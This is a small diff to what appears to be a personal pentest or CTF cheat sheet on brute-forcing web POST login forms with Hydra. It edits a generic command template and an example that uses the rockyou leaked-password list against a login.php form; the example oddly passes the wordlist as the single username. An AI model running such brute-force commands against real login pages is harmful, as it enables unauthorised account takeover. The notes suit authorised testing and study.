@@ -22,7 +22,7 @@
 
 ## POST login form
 
-- `hydra -l <username> -P <wordlist> <ip> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
+- `hydra -l u -P w $(cat ip) http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
   - `-l` for login/username
   - `-P` for password
   - `http-post-form` for form type
@@ -32,7 +32,7 @@
 
 **Examples:**
 
-- `hydra -l /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt $(cat ip) http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V`
+- `hydra -l /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt $(cat ip) http-post-form "/login.php:username=^USER^&password=^PASS^:F=invalid" -V`
 
 ## Wordlist locations to copy
 
